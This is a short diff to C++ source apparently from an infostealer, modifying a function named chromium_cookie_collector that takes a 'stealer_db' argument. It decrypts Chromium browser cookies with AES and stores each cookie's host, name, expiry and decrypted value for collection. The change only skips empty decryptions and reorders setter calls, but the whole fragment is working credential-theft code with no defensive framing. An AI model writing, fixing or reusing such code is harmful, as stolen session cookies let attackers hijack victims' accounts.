@@ -193,17 +193,19 @@ BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
 						if ((strlen(host_key) == 0) || (strlen(name) == 0) || cookies.empty())
 							continue;
 
-
-						data.get_cookies_manager().setUrl(host_key);
-						data.get_cookies_manager().setCookieName(name);
-						data.get_cookies_manager().setHost(dir);
-						data.get_cookies_manager().setCookiesExpiry(expiry);
-
 						try
 						{
 							//decrypt cookies here
 							std::string decrypted_cookies = obj.AESDecrypter(cookies);
+
+							if (decrypted_cookies.empty())
+								continue;
+
 							data.get_cookies_manager().setCookies(decrypted_cookies);
+							data.get_cookies_manager().setUrl(host_key);
+							data.get_cookies_manager().setCookieName(name);
+							data.get_cookies_manager().setHost(dir);
+							data.get_cookies_manager().setCookiesExpiry(expiry);
 						}
 						catch (int e)
 						{
